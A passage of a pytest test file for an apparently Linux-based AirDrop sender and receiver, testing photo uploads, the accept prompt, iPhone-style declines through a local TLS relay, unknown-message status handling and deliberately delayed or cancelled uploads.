                    cpio += _odc(f"./{folder}", b"", 0o040755)
            cpio += _odc(f"./{path}", data)
            if path.endswith(".HEIC"):  # the AppleDouble sidecar iOS adds next to each photo
                cpio += _odc(f"./{'/'.join(parts[:-1])}/._{parts[-1]}", os.urandom(1830))
        cpio += _odc("TRAILER!!!", b"", 0)
        files = [{"FileName": path.rsplit("/", 1)[1], "FileType": "public.data", "FileSize": len(data),
                  "FileBomPath": f"./{path}", "FileIsDirectory": False} for path, data in items.items()]
        apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
        ask = _plist({"SenderComputerName": "TestPhone", "SenderModelName": "iPhone", "SenderID": "5f4e3d2c1b0a",
                          "BundleID": "com.apple.mobileslideshow", "TransferID": {"id": tid},
                          "TransferType": {"files": {}}, "Items": [], "Files": files})
        s = _raw_conn(rx.port)
        s.settimeout(10)
        _chunked_post(s, "/Ask", ask, apple)
        assert _read_response(s)[0] == 200
        _chunked_post(s, "/Upload", _dvzip(cpio), [
            ("User-Agent", "AirDrop/1.0"), ("TotalBytes", str(sum(map(len, items.values())))),
            ("Content-Type", "application/x-dvzip"), ("TransferID", tid),
            ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")], finish=False)
        assert _read_response(s)[0] == 200
        s.close()
        assert _wait_for(lambda: len(list(rx.downloads.iterdir())) == 3)
    finally:
        rx.stop()
    assert sorted(p.name for p in rx.downloads.iterdir()) == ["IMG_1604.HEIC", "IMG_1606.MOV", "IMG_1616.HEIC"]
    for path, data in items.items():
        assert (rx.downloads / path.rsplit("/", 1)[1]).read_bytes() == data


def test_enter_alone_does_not_decline(homes, tree):
    """2026-11-12: a bare Enter at "Accept?" counted as no. The question is asked again
    instead, and the transfer the user then accepts arrives."""
    rhome, shome = homes
    rx = Receiver(rhome, "--ask")
    try:
        p = subprocess.Popen(SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac",
                                    str(tree / "movie.mp4")],
                             env=_env(shome), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(1.0)
        rx.answer("")
        time.sleep(0.5)
        rx.answer("y")
        _, err = p.communicate(timeout=30)
        assert p.returncode == 0, err
    finally:
        _, err = rx.stop()
    assert err.count("Accept?") == 2
    assert "Declined" not in err
    assert (rx.downloads / "movie.mp4").exists()


def test_iphone_closes_connection_on_ask_reads_as_declined_not_a_failure(homes, tmp_path):
    """2026-11-12: an iPhone whose user taps Decline (or has AirDrop off, or is rate
    limiting us) drops the connection instead of answering /Ask. The sender says it
    was declined, exits with the declined code, and does not retry /Ask."""
    import threading
    receiver_home, sender_home = homes
    rx = Receiver(receiver_home)
    key, crt = tmp_path / "k.pem", tmp_path / "c.pem"
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", str(key),
                    "-out", str(crt), "-subj", "/CN=iphone", "-days", "1"], check=True, capture_output=True)
    sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    sctx.load_cert_chain(crt, key)
    cctx = ssl.create_default_context()
    cctx.check_hostname, cctx.verify_mode = False, ssl.CERT_NONE
    srv = socket.create_server(("::1", 0), family=socket.AF_INET6)
    asks = []

    def pump(a, b):
        try:
            while d := a.recv(65536):
                b.sendall(d)
        except OSError:
            pass
        for s in (a, b):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass

    def serve():
        while True:
            try:
                raw, _ = srv.accept()
                conn = sctx.wrap_socket(raw, server_side=True)
                first = conn.recv(65536)
            except OSError:
                return
            if b"/Ask" in first:
                asks.append(1)
                conn.close()  # no HTTP status at all
                continue
            up = cctx.wrap_socket(socket.create_connection(("::1", rx.port)), server_hostname="x")
            up.sendall(first)
            threading.Thread(target=pump, args=(conn, up), daemon=True).start()
            threading.Thread(target=pump, args=(up, conn), daemon=True).start()

    threading.Thread(target=serve, daemon=True).start()
    try:
        photo = tmp_path / "photo.jpg"
        photo.write_bytes(os.urandom(10_000))
        r = send(sender_home, srv.getsockname()[1], str(photo), timeout=40)
    finally:
        srv.close()
        rx.stop()
    assert "declined" in r.stderr and "request failed" not in r.stderr, r.stderr
    assert r.returncode != 1, r.stderr
    assert len(asks) == 1, "a decline must not be retried"


def test_message_we_do_not_implement_gets_the_status_the_user_chose(homes):
    """E5.4/E5.7 knob: with AIRDROP_UNKNOWN_STATUS=200 a message we do not implement
    (here /Hello) is answered 200 with an empty plist instead of 400, lands in the dump,
    and the same connection goes on to a normal /Discover."""
    import json
    rhome, _ = homes
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    dumpdir = rhome / "dumps"
    rx = Receiver(rhome, "--accept-all", "--dump", str(dumpdir), env={"AIRDROP_UNKNOWN_STATUS": "200"})
    try:
        with _raw_conn(rx.port) as s:
            s.settimeout(10)
            _chunked_post(s, "/Hello", _plist({"FeatureFlags": 1, "ContextType": "unknown"}), apple)
            status, body = _read_response(s)
            assert status == 200 and _unplist(body) == {}
            _chunked_post(s, "/Discover", _plist({"DeviceSupportFlags": RECEIVER_FLAGS}), apple)
            status, body = _read_response(s)
            assert status == 200 and _unplist(body)["ReceiverComputerName"] == "Linux Box"
    finally:
        _, err = rx.stop()
    hello = json.loads(next(next(dumpdir.iterdir()).glob("*-Hello.json")).read_text())
    assert hello["plist"]["FeatureFlags"] == 1 and hello["our_status"] == 200
    assert "/Hello" in err and "answered 200" in err, err


def test_sender_stops_or_delays_the_upload_when_user_sets_experiment(homes, tmp_path):
    """E5.8/E5.9 knobs: the sender starts the upload late, or stops it part-way on
    purpose. Late still arrives intact; stopped says so, fails, and the receiver keeps
    nothing of the cut-off file."""
    receiver_home, sender_home = homes
    big = tmp_path / "clip.mov"
    big.write_bytes(os.urandom(12 * 1024 * 1024))
    small = tmp_path / "note.txt"
    small.write_text("hello\n")
    rx = Receiver(receiver_home, "--accept-all")
    try:
        cmd = SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac"]
        t0 = time.monotonic()
        late = subprocess.run(cmd + [str(small)], env={**_env(sender_home), "AIRDROP_SEND_UPLOAD_DELAY": "1.5"},
                              capture_output=True, text=True, timeout=60)
        assert late.returncode == 0, late.stderr
        assert time.monotonic() - t0 >= 1.4 and "late" in late.stdout
        assert _wait_for(lambda: (rx.downloads / "note.txt").is_file())
        assert (rx.downloads / "note.txt").read_text() == "hello\n"

        cut = subprocess.run(cmd + [str(big)], env={**_env(sender_home), "AIRDROP_SEND_CANCEL_AT": "30"},
                             capture_output=True, text=True, timeout=60)
        assert cut.returncode != 0 and "stopped on purpose" in cut.stdout + cut.stderr, cut.stdout + cut.stderr
        assert _wait_for(lambda: [p.name for p in rx.downloads.iterdir()] == ["note.txt"], 20), \
            f"left behind: {[p.name for p in rx.downloads.iterdir()]}"
    finally:
        _, err = rx.stop()
    assert "Traceback" not in err, err
